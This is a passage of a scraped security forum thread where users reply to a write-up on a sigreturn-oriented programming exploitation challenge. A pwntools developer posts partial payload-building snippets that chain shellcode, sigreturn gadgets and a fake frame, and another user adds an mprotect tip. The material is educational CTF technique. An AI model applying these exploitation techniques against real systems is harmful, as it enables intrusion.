<img src="../../../0x00sec.s3.amazonaws.com/original/2X/8/828a03814074db9fad4c6a169c2c6d144cc90f50.gif" width="356" height="200"></p>
</li>
<li>
<p>Good luck. Search much, and learn much! <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
</li>
</ul>
<p>~ exploit</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="29" />
              <span class='post-likes'>29 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/M3r8.html'><span itemprop='name'>M3r8</span></a>
                (M3r8)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-11T19:32:26Z' class='post-time'>
                    July 11, 2017,  7:32pm
                  </time>
                  <meta itemprop='dateModified' content='2017-07-11T19:32:26Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>do you like emojis ?<img src="../../../0x00sec.org/images/emoji/twitter/sunglassesc164.html?v=9" title=":sunglasses:" class="emoji" alt=":sunglasses:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-11T19:33:13Z' class='post-time'>
                    July 11, 2017,  7:33pm
                  </time>
                  <meta itemprop='dateModified' content='2017-07-11T19:33:13Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Of course i do! <img src="../../../0x00sec.org/images/emoji/twitter/joy_catc164.html?v=9" title=":joy_cat:" class="emoji" alt=":joy_cat:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/_py.html'><span itemprop='name'>_py</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-11T20:07:58Z' class='post-time'>
                    July 11, 2017,  8:07pm
                  </time>
                  <meta itemprop='dateModified' content='2017-07-11T20:18:07Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Nice write-up <a class="mention" href="../../u/exploit.html">@exploit</a>!</p>
<p>For those who don‚Äôt quite get the theory behind that technique, I‚Äôd highly recommend reading the reference links.</p>
<p>TL;DR - When a signal occurs, the kernel ‚Äúpauses‚Äù the process‚Äôs execution in order to jump to a signal handler routine. In order to safely resume the execution after the handler, the context of that process is pushed/saved on the stack (registers, flags, instruction pointer, stack pointer etc). When the handler is finished, sigreturn() is being called which will restore the context of the process by popping the values off of the stack. That‚Äôs what is being exploited in that technique.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="6" />
              <span class='post-likes'>6 Likes</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-11T20:11:47Z' class='post-time'>
                    July 11, 2017,  8:11pm
                  </time>
                  <meta itemprop='dateModified' content='2017-07-11T20:11:47Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thank you *_* ! <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/fraq.html'><span itemprop='name'>fraq</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-11T20:35:11Z' class='post-time'>
                    July 11, 2017,  8:35pm
                  </time>
                  <meta itemprop='dateModified' content='2017-07-11T20:35:11Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I‚Äôm gonna have to read this a few more times to fully digest. This is super good.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-11T20:41:47Z' class='post-time'>
                    July 11, 2017,  8:41pm
                  </time>
                  <meta itemprop='dateModified' content='2017-07-11T20:41:47Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Happy you liked it <img src="../../../0x00sec.org/images/emoji/twitter/smilec164.html?v=9" title=":smile:" class="emoji" alt=":smile:">!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/_py.html'><span itemprop='name'>_py</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-12T11:41:58Z' class='post-time'>
                    July 12, 2017, 11:41am
                  </time>
                  <meta itemprop='dateModified' content='2017-07-12T11:41:58Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Done. Thanks for the challenge mate! <a class="mention" href="../../u/exploit.html">@exploit</a> requested not to release the exploit code yet so that more folks can give it a shot.</p>
<p>You can find the PoC <a href="../../../external.html?link=https://asciinema.org/a/YdiZnENwxGtsI61D9BnHANpRi" rel="nofollow noopener">here</a>.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_9' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>


                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/a/a4770c2019a457c7f313ac07706c71c78e109e62.gif">

              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-12T11:44:02Z' class='post-time'>
                    July 12, 2017, 11:44am
                  </time>
                  <meta itemprop='dateModified' content='2017-07-12T11:44:02Z'>
              <span itemprop='position'>9</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <blockquote>
<p>Well done, and no problem *_*! <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"><br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/a4770c2019a457c7f313ac07706c71c78e109e62.gif" width="500" height="281"></p>
</blockquote>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_10' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/ricksanchez.html'><span itemprop='name'>ricksanchez</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-12T15:17:26Z' class='post-time'>
                    July 12, 2017,  3:17pm
                  </time>
                  <meta itemprop='dateModified' content='2017-07-12T15:17:26Z'>
              <span itemprop='position'>10</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>awesome article <a class="mention" href="../../u/exploit.html">@exploit</a>. I‚Äôm on this one with <a class="mention" href="../../u/fraq.html">@fraq</a> tho. Need to reread it a few times to fully grasp to potential here! <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_11' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-12T15:23:55Z' class='post-time'>
                    July 12, 2017,  3:23pm
                  </time>
                  <meta itemprop='dateModified' content='2017-07-12T15:23:55Z'>
              <span itemprop='position'>11</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thank you! <img src="../../../0x00sec.org/images/emoji/twitter/laughingc164.html?v=9" title=":laughing:" class="emoji" alt=":laughing:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_12' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/febri.html'><span itemprop='name'>febri</span></a>
                (Febriyanto Nugroho)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-13T05:31:43Z' class='post-time'>
                    July 13, 2017,  5:31am
                  </time>
                  <meta itemprop='dateModified' content='2017-07-13T05:31:43Z'>
              <span itemprop='position'>12</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>awesome article <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_13' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-13T11:01:50Z' class='post-time'>
                    July 13, 2017, 11:01am
                  </time>
                  <meta itemprop='dateModified' content='2017-07-13T11:01:50Z'>
              <span itemprop='position'>13</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>*_* Thank you! <img src="../../../0x00sec.org/images/emoji/twitter/smilec164.html?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_14' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/zachriggle.html'><span itemprop='name'>zachriggle</span></a>
                (Zach Riggle)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-14T03:15:26Z' class='post-time'>
                    July 14, 2017,  3:15am
                  </time>
                  <meta itemprop='dateModified' content='2017-07-14T03:15:26Z'>
              <span itemprop='position'>14</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hey, pwntools developer here!</p>
<p>Here‚Äôs some additional pro tips you may want to integrate into your blog</p>
<pre><code class="lang-auto">payload = str(foo)
payload += pack(bar)
payload += baz
</code></pre>
<p>Can be collapsed down into a single statement with the <code>flat()</code> function.</p>
<pre><code class="lang-auto">payload = flat(foo, bar, baz)
</code></pre>
<p>Integers are passed to pack, strings are untouched, and everything else gets <code>__pack__()</code> invoked on it.</p>
<p>Additionally, it looks like you‚Äôre aligning your payload to a specific boundary.  There is another routine, <code>fit()</code>, which handles this automagically <em>and</em> makes the padding a valid <code>cyclic()</code> offset.  This way, if you mess up offsets, you will have e.g. <code>"faab"</code> instead of <code>"AAAA"</code>.</p>
<pre><code class="lang-auto">pad = cyclic_find("faab")
# 120
</code></pre>
<p>The way that this works with <code>fit()</code> would look like:</p>
<pre><code class="lang-auto">payload = fit({
    pad: "BBBB" # Overwriting saved RIP with BBBB
})
</code></pre>
<p><code>fit()</code> just calls <code>flat()</code> on everything passed to it, so you can pass arrays of things to be set at a given offset.</p>
<pre><code class="lang-auto">payload = fit({
  0: shellcode,          # PLACING SHELLCODE IN BEGINNING OF BUFF
  pad: [mov_rax_15_ret,  # SET RAX TO SIGRETURN SYSCALL NUMBER
        syscall_ret,     # CALL SIGRETURN
        frame,           # PLACE FAKE FRAME ON STACK
        leak]            # RETURN2SHELLCODE
})
</code></pre>
<p>For attaching with GDB, you might want to look at the Pwntools function <code>gdb.attach()</code> and <code>gdb.debug()</code>!</p>
<p>Finally, a small nit: You don‚Äôt have to specify <code>kernel=</code> for <code>SigreturnFrame</code> unless the target arch is <code>i386</code>.  Since it‚Äôs <code>amd64</code>, this is unnecessary.</p>
<p>Thanks for the article, and thanks for using Pwntools!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="12" />
              <span class='post-likes'>12 Likes</span>
            </div>


            
          </div>
          <div id='post_15' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/gtx.html'><span itemprop='name'>gtx</span></a>
                (gtx)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-14T10:43:59Z' class='post-time'>
                    July 14, 2017, 10:43am
                  </time>
                  <meta itemprop='dateModified' content='2017-07-14T10:43:59Z'>
              <span itemprop='position'>15</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Excellent write-up <a class="mention" href="../../u/exploit.html">@exploit</a> !</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_16' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-14T11:07:50Z' class='post-time'>
                    July 14, 2017, 11:07am
                  </time>
                  <meta itemprop='dateModified' content='2017-07-14T16:35:37Z'>
              <span itemprop='position'>16</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <ul>
<li>
<a class="mention" href="../../u/zachriggle.html">@zachriggle</a> Thank you so much for your tip! I‚Äôll surely use them in my next write-ups! Thank you for creating pwntools, such an amazing tool! <img src="../../../0x00sec.org/images/emoji/twitter/smilec164.html?v=9" title=":smile:" class="emoji" alt=":smile:">
</li>
</ul>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_17' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-07-14T11:08:28Z' class='post-time'>
                    July 14, 2017, 11:08am
                  </time>
                  <meta itemprop='dateModified' content='2017-07-14T11:08:28Z'>
              <span itemprop='position'>17</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <ul>
<li>
<a class="mention" href="../../u/gtx.html">@gtx</a> Happy you liked it <img src="../../../0x00sec.org/images/emoji/twitter/smilec164.html?v=9" title=":smile:" class="emoji" alt=":smile:">!</li>
</ul>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_18' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/sloth.html'><span itemprop='name'>sloth</span></a>
                (Linux Kernel Fetishist)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-11-16T14:57:43Z' class='post-time'>
                    November 16, 2017,  2:57pm
                  </time>
                  <meta itemprop='dateModified' content='2017-11-16T14:57:43Z'>
              <span itemprop='position'>18</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Great explanation!<br>
One thing i noticed during a walktrough was that with  <code>int mprotect(void *addr, size_t len, int prot);</code> you need to specify an multiple or the start of an page, otherwise it will not set the permissions correctly. (see man mprotect, EINVAL for more‚Ä¶)</p>
<p>So to calculate the beginning of a page simple calculate it the following way: <code> addr &amp; ~(page_size-1)</code><br>
where addr is your pointer and page_size is 4096 most of the time.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_19' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/neolex.html'><span itemprop='name'>neolex</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-11-17T15:51:36Z' class='post-time'>
                    November 17, 2017,  3:51pm
                  </time>
                  <meta itemprop='dateModified' content='2017-11-17T15:51:36Z'>
              <span itemprop='position'>19</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Great article, thank you !<br>
Can you re-upload the binary for the challenge please ?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_20' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/sloth.html'><span itemprop='name'>sloth</span></a>
                (Linux Kernel Fetishist)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-11-17T16:41:46Z' class='post-time'>
                    November 17, 2017,  4:41pm
                  </time>
                  <meta itemprop='dateModified' content='2017-11-17T16:41:46Z'>
              <span itemprop='position'>20</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Just compile the source code with -m32. The challenge was to use the method on x86, therefore that should be enough</p>
<pre><code>gcc source.c -m32 -o binary</code></pre>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
    </div>

      <div role='navigation' itemscope itemtype='http://schema.org/SiteNavigationElement' class="topic-body crawler-post">
            <span itemprop='name'><b><a rel="next" itemprop="url" href="28904658.html?page=2">next page ‚Üí</a></b></span>
      </div>

    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="q5dpvdo8349u9YUdJWfjbo8oF"></script>
  </body>
  
</html>
